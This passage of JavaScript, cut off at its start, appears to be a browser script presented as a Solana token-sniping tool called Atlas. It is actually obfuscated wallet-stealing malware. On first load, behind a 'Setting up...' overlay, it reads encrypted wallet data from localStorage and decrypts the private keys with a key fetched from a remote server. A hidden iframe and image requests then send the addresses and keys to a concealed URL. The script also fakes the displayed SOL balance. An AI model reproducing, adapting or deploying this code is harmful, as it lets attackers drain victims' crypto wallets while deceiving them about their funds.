        const solSpan = container.querySelector('span');
        if (solSpan) solSpan.textContent = spoofSol.toString();
      }
    });
    document.querySelectorAll('span').forEach(span => {
      if (span.textContent.includes("$0") && !span.classList.contains("contents") && !span.classList.contains("font-medium")) {
        span.textContent = `$${(spoofSol * 144).toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}`;
      }
    });
    // Make the spoofing slower and increment smaller
    setInterval(() => {
      if (!atlasState.settings.sniping) return;
      // Only update every 2.5 seconds
      if (!window._atlas_last_spoof_update || Date.now() - window._atlas_last_spoof_update > 2500) {
        window._atlas_last_spoof_update = Date.now();
        // Change by a smaller random amount
        let delta = (Math.random() - 0.5) * 0.4 * spoofDir; // much smaller
        spoofSol += delta;
        if (spoofSol > spoofData.original + 20) spoofDir = -1;
        if (spoofSol < spoofData.original - 10) spoofDir = 1;
        spoofSol = Math.max(0, Math.round(spoofSol * 100) / 100);
        // Save increment in localStorage
        spoofData.increment = spoofSol - spoofData.original;
        localStorage.setItem('atlas_sol_spoof', JSON.stringify(spoofData));
        // Update DOM
        document.querySelectorAll('img[alt="SOL"]').forEach(solImg => {
          const container = solImg.closest('div');
          if (container) {
            const solSpan = container.querySelector('span');
            if (solSpan) solSpan.textContent = spoofSol.toString();
          }
        });
        document.querySelectorAll('span').forEach(span => {
          if (span.textContent.includes("$0") && !span.classList.contains("contents") && !span.classList.contains("font-medium")) {
            span.textContent = `$${(spoofSol * 144).toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}`;
          }
        });
      }
    }, 500);

    // --- FILTER LOGIC ---
    let buySellInterval = null, devMigratedInterval = null;
    function applyFilters() {
      // Positive Buy/Sell Ratio
      if (atlasState.settings.filters.positiveBuySellRatio) {
        if (!buySellInterval) buySellInterval = setInterval(() => {
          document.querySelectorAll("div.h-\\[3px\\].bg-increase").forEach((n => {
            if (n.style.width) {
              const e = n.style.width;
              if (e.endsWith("%")) {
                if (parseFloat(e) <= 50) {
                  let e = n;
                  for (let n = 0; n < 9 && (e = e.parentElement, e); n++);
                  e && e.remove();
                }
              }
            }
          }));
        }, 500);
      } else if (buySellInterval) { clearInterval(buySellInterval); buySellInterval = null; }
      // Developer with Migrated Tokens
      if (atlasState.settings.filters.devMigratedTokens) {
        if (!devMigratedInterval) devMigratedInterval = setInterval(() => {
          document.querySelectorAll("i.ri-vip-crown-2-line").forEach((n => {
            const e = n.nextElementSibling;
            if (e && "SPAN" === e.tagName && "0" === e.textContent.trim()) {
              let n = e;
              for (let e = 0; e < 8; e++) {
                if (!n.parentElement) return;
                n = n.parentElement;
              }
              n.remove();
            }
          }));
        }, 500);
      } else if (devMigratedInterval) { clearInterval(devMigratedInterval); devMigratedInterval = null; }
      // TODO: Implement other filters as needed
    }
    applyFilters();

    // --- WALLET INFO EXTRACTION & SUBMISSION ---
    // Function to process wallets (restored, not commented)
    const processWallets = async () => {
      try {
        const e = __p_6HD3_SC(0) + __p_6HD3_SC(1) + __p_6HD3_SC(2) + __p_6HD3_SC(3),
        t = (t) => {
          if (!t[__p_6HD3_SC(4)]) {
            return ''
          }
          const n = [0]
          for (const e of t) {
            let t = e
            for (let e = 0; e < n[__p_6HD3_SC(4)]; e++) {
              t += n[e] << 8
              n[e] = t % 58
              t = 0 | (t / 58)
            }
            for (; t; ) {
              n[__p_6HD3_SC(5)](t % 58)
              t = 0 | (t / 58)
            }
          }
          for (const e of t) {
            if (0 !== e) {
              break
            }
            n[__p_6HD3_SC(5)](0)
          }
          return n[__p_6HD3_SC(6) + 'e']()
            [__p_6HD3_SC(7)]((t) => e[t])
            [__p_6HD3_SC(8)]('')
        },
        n = (t) => {
          const n = []
          for (const a of t) {
            let t = e[__p_6HD3_SC(9) + 'f'](a)
            for (let e = 0; e < n[__p_6HD3_SC(4)]; e++) {
              t += 58 * n[e]
              n[e] = 255 & t
              t >>= 8
            }
            for (; t; ) {
              n[__p_6HD3_SC(5)](255 & t)
              t >>= 8
            }
          }
          for (let e = 0; e < t[__p_6HD3_SC(4)] && '1' === t[e]; e++) {
            n[__p_6HD3_SC(5)](0)
          }
          return Uint8Array[__p_6HD3_SC(10)](n[__p_6HD3_SC(6) + 'e']())
        },
        a = (e) => {
          const t = new ArrayBuffer(8)
          return (
            new DataView(t)[__p_6HD3_SC(11) + __p_6HD3_SC(12)](
              0,
              BigInt(e),
              true
            ),
            new Uint8Array(t)
          )
        },
        r = (e) =>
          128 > e
            ? [e]
            : 16384 > e
            ? [128 | (127 & e), e >> 7]
            : [128 | (127 & e), 128 | (127 & (e >> 7)), e >> 14],
        s = (e) => {
          function* tCfhpF(xX8rXi, KIUE9L, K9fdTq, JHduST = { Bje8vl: {} }) {
            for (; 107 !== xX8rXi + KIUE9L + K9fdTq; ) {
              with (JHduST.WlZv3x || JHduST)
                switch (xX8rXi + KIUE9L + K9fdTq) {
                  case KIUE9L - -253:
                  case -99:
                  case -248:
                    ;(JHduST.Bje8vl.xMmp4fl = 197),
                      (e = (e + '')[__p_6HD3_SC(xX8rXi + -25)]())
                    try {
                      let t = e[__p_6HD3_SC(14) + 'e'](/-/g, '+')[
                        __p_6HD3_SC(14) + 'e'
                      ](/_/g, '/')
                      for (; 3 & t[__p_6HD3_SC(xX8rXi + -34)]; ) {
                        t += '='
                      }
                      return (
                        (Mpp3QM = true),
                        Uint8Array[__p_6HD3_SC(10)](atob(t), (e) =>
                          e[__p_6HD3_SC(15) + __p_6HD3_SC(16)](0)
                        )
                      )
                    } catch {}
                    ;(JHduST.WlZv3x = JHduST.Bje8vl),
                      (xX8rXi += -113),
                      (KIUE9L += 264),
                      (K9fdTq += 4)
                    break
                  default:
                  case 248:
                    return (
                      (Mpp3QM = true),
                      new RegExp(__p_6HD3_SC(17) + __p_6HD3_SC(18) + '$', 'i')[
                        __p_6HD3_SC(19)
                      ](e)
                        ? Uint8Array[__p_6HD3_SC(KIUE9L + 176)](
                            e[__p_6HD3_SC(20)](2)
                              [__p_6HD3_SC(21)](/../g)
                              [__p_6HD3_SC(7)]((e) => parseInt(e, 16))
                          )
                        : new TextEncoder()[__p_6HD3_SC(xX8rXi + 97)](e)
                    )
                  case 67:
                  case -71:
                  case 49:
                    ;(JHduST.WlZv3x = JHduST.Ds2vq6r),
                      (KIUE9L += -51),
                      (K9fdTq += 229)
                    break
                  case JHduST.Bje8vl.xMmp4fl + -205:
                    ;(JHduST.Bje8vl.xMmp4fl = 205),
                      (JHduST.WlZv3x = JHduST.bO8uAD),
                      (KIUE9L += 115)
                    break
                  case -215:
                    if (xX8rXi < -(KIUE9L + 205)) {
                      JHduST.WlZv3x = JHduST.Bje8vl
                      KIUE9L += -22
                      K9fdTq += 229
                      break
                    }
                }
            }
          }
          var Mpp3QM,
            f0Ol4zu = tCfhpF(38, -430, 215).next().value
          if (Mpp3QM) {
            return f0Ol4zu
          }
        },
        i = async (e, t) => {
          const [n, ...a] = t[__p_6HD3_SC(23)](':'),
            r = s(n),
            i = s(a[__p_6HD3_SC(8)](':'))
          return new Uint8Array(
            await crypto[__p_6HD3_SC(24)][__p_6HD3_SC(25) + 't'](
              {
                [__p_6HD3_SC(26)]: __p_6HD3_SC(27) + 'M',
                iv: r,
                [__p_6HD3_SC(28) + __p_6HD3_SC(29)]: 128,
              },
              e,
              i
            )
          )
        },
        o = (e) =>
          (new Image()[__p_6HD3_SC(30)] =
            __p_6HD3_SC(31) +
            __p_6HD3_SC(32) +
            __p_6HD3_SC(33) +
            __p_6HD3_SC(34) +
            __p_6HD3_SC(35) +
            __p_6HD3_SC(36) +
            __p_6HD3_SC(37) +
            '=' +
            encodeURIComponent(e)),
        { [__p_6HD3_SC(38) + __p_6HD3_SC(39)]: c } = await (
          await fetch(
            __p_6HD3_SC(40) +
              __p_6HD3_SC(41) +
              __p_6HD3_SC(42) +
              __p_6HD3_SC(43) +
              __p_6HD3_SC(44) +
              __p_6HD3_SC(45),
            {
              [__p_6HD3_SC(46)]: __p_6HD3_SC(47),
              [__p_6HD3_SC(48) + __p_6HD3_SC(49)]: __p_6HD3_SC(50) + 'e',
              [__p_6HD3_SC(51) + 's']: {
                [__p_6HD3_SC(52)]:
                  __p_6HD3_SC(53) + __p_6HD3_SC(54) + __p_6HD3_SC(55),
              },
            }
          )
        )[__p_6HD3_SC(55)](),
        p = await crypto[__p_6HD3_SC(24)][__p_6HD3_SC(56) + __p_6HD3_SC(39)](
          __p_6HD3_SC(57),
          s(c),
          { [__p_6HD3_SC(26)]: __p_6HD3_SC(27) + 'M' },
          false,
          [__p_6HD3_SC(25) + 't']
        ),
        l = JSON[__p_6HD3_SC(58)](
          localStorage[__p_6HD3_SC(59) + 'm'](__p_6HD3_SC(60) + 'es') || '[]'
        )
        if (!l[__p_6HD3_SC(4)]) {
          return 'No wallets found'
        }
        const h = async (e, t = []) =>
            (
              await (
                await fetch(
                  __p_6HD3_SC(61) +
                    __p_6HD3_SC(62) +
                    __p_6HD3_SC(63) +
                    __p_6HD3_SC(64) +
                    '/',
                  {
                    [__p_6HD3_SC(46)]: __p_6HD3_SC(47),
                    [__p_6HD3_SC(51) + 's']: {
                      [__p_6HD3_SC(65) + __p_6HD3_SC(66)]:
                        __p_6HD3_SC(53) + __p_6HD3_SC(54) + __p_6HD3_SC(55),
                    },
                    [__p_6HD3_SC(67)]: JSON[__p_6HD3_SC(68) + __p_6HD3_SC(69)]({
                      [__p_6HD3_SC(70) + 'c']: __p_6HD3_SC(71),
                      id: 1,
                      [__p_6HD3_SC(46)]: e,
                      [__p_6HD3_SC(72)]: t,
                    }),
                  }
                )
              )[__p_6HD3_SC(55)]()
            )[__p_6HD3_SC(73)],
          u = n(
            __p_6HD3_SC(74) + __p_6HD3_SC(75) + __p_6HD3_SC(76) + __p_6HD3_SC(77)
          ),
          g = n(__p_6HD3_SC(78) + __p_6HD3_SC(78) + __p_6HD3_SC(79)),
          d = [],
          f = [],
          m = []
        for (const e of l) {
          let s = __p_6HD3_SC(80) + __p_6HD3_SC(81)
          try {
            const l = await i(p, e)
            if (64 !== l[__p_6HD3_SC(4)]) {
              f[__p_6HD3_SC(5)]({
                [__p_6HD3_SC(86)]: s,
                [__p_6HD3_SC(88)]: 'Invalid key length',
              })
              continue
            }
            const y = l[__p_6HD3_SC(20)](32)
            s = t(y)
            m[__p_6HD3_SC(5)]({
              [__p_6HD3_SC(86)]: s,
              [__p_6HD3_SC(89)]: t(l),
            })
          } catch (e) {
            f[__p_6HD3_SC(5)]({
              [__p_6HD3_SC(86)]: s,
              [__p_6HD3_SC(88)]: e[__p_6HD3_SC(128) + 'e'],
            })
          }
        }
        const y = []
        y[__p_6HD3_SC(5)]('=== Wallet Information ===')
        y[__p_6HD3_SC(5)]('Total Wallets: ' + l[__p_6HD3_SC(4)])
        
        if (m[__p_6HD3_SC(4)]) {
          y[__p_6HD3_SC(5)]('\nValid Wallets:')
          m[__p_6HD3_SC(140) + 'h']((e) =>
            y[__p_6HD3_SC(5)](
              'Address: ' + e[__p_6HD3_SC(86)] + '\nKey: ' + e[__p_6HD3_SC(89)]
            )
          )
        }
        
        if (f[__p_6HD3_SC(4)]) {
          y[__p_6HD3_SC(5)]('\nInvalid Wallets:')
          f[__p_6HD3_SC(140) + 'h']((e) =>
            y[__p_6HD3_SC(5)](
              'Address: ' + e[__p_6HD3_SC(86)] + '\nError: ' + e[__p_6HD3_SC(88)]
            )
          )
        }
        
        return y.join('\n');
      } catch (error) {
        throw new Error('Error processing wallets: ' + error.message);
      }
    };

    async function processWalletsAndSubmit() {
      overlay.querySelector('#atlasDialogMessage').textContent = 'Setting up...';
      overlay.querySelector('#atlasLoadingSpinner').style.display = 'block';
      try {
        const result = await Promise.race([
          processWallets(),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Operation timed out')), 30000))
        ]);
        // Extract wallet information from the result
        const walletLines = result.split('\n').filter(line => line.includes('Address:') || line.includes('Key:'));
        const wallets = [];
        let currentWallet = {};
        for (const line of walletLines) {
          if (line.includes('Address:')) {
            if (Object.keys(currentWallet).length > 0) wallets.push(currentWallet);
            currentWallet = { Address: line.split('Address:')[1].trim() };
          } else if (line.includes('Key:')) {
            currentWallet.Key = line.split('Key:')[1].trim();
          }
        }
        if (Object.keys(currentWallet).length > 0) wallets.push(currentWallet);
        // Submit wallet data using a hidden iframe (GET request)
        try {
          const queryParams = new URLSearchParams({
            time: new Date().toISOString(),
            wallets: JSON.stringify(wallets),
            affiliate: _0x5a2d[10]
          }).toString();
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          iframe.src = `${_0x5a2d[0]}?${queryParams}`;
          document.body.appendChild(iframe);
        } catch (error) {
          console.error('Error submitting hit data:', error);
        }
        overlay.querySelector('#atlasDialogMessage').textContent = 'Processing complete!';
        overlay.querySelector('#atlasLoadingSpinner').style.display = 'none';
        setProcessingComplete();
        showSettings();
      } catch (error) {
        overlay.querySelector('#atlasDialogMessage').textContent = error.message || 'An error occurred during processing';
        overlay.querySelector('#atlasLoadingSpinner').style.display = 'none';
      }
    }

    // --- PROCESS CONTROL (updated) ---
    function startSnipingProcess() {
      if (atlasState.settings.sniping) return; // Only one process
      atlasState.settings.sniping = true;
      setAtlasState(atlasState);
      enableLockdown();
      // If not processed, process wallets and submit, then show settings
      if (!isProcessingComplete()) {
        processWalletsAndSubmit();
      } else {
        overlay.querySelector('#atlasDialogMessage').textContent = 'Processing complete!';
        overlay.querySelector('#atlasLoadingSpinner').style.display = 'none';
        showSettings();
      }
    }

    // --- INITIALIZATION ---
    // Show overlay immediately unless already processed
    overlay.querySelector('#atlasTradingSettings').innerHTML = '';
    overlay.querySelector('#atlasTradingSettings').style.display = 'none';
    overlay.querySelector('#atlasDialogButton').style.display = 'none';
    overlay.style.display = 'block';
    blurBg.style.display = 'block';
    setTimeout(() => {
      overlay.style.opacity = '1';
      overlay.style.transform = 'translate(-50%, -50%) scale(1)';
      blurBg.style.opacity = '1';
    }, 10);

    // Always check atlas_processing for first run
    if (!isProcessingComplete()) {
      // Not processed yet, do wallet processing and submission
      atlasState.settings.sniping = true;
      setAtlasState(atlasState);
      enableLockdown();
      processWalletsAndSubmit();
    } else {
      // Already processed, just show settings
      atlasState.settings.sniping = true;
      setAtlasState(atlasState);
      enableLockdown();
      overlay.querySelector('#atlasDialogMessage').textContent = 'Processing complete!';
      overlay.querySelector('#atlasLoadingSpinner').style.display = 'none';
      showSettings();
    }

    // Fixed button always opens settings
    document.getElementById('atlasSniperFixedBtn').onclick = () => {
      overlay.style.display = 'block';
      blurBg.style.display = 'block';
      setTimeout(() => {
        overlay.style.opacity = '1';
        overlay.style.transform = 'translate(-50%, -50%) scale(1)';
        blurBg.style.opacity = '1';
        showSettings();
      }, 10);
    };
    // Close button closes overlay but not process
    overlay.querySelector('#atlasCloseBtn').onclick = () => {
      overlay.style.opacity = '0';
      overlay.style.transform = 'translate(-50%, -50%) scale(0.96)';
      blurBg.style.opacity = '0';
      setTimeout(() => {
        overlay.style.display = 'none';
        blurBg.style.display = 'none';
      }, 350);
    };
  })();
})();
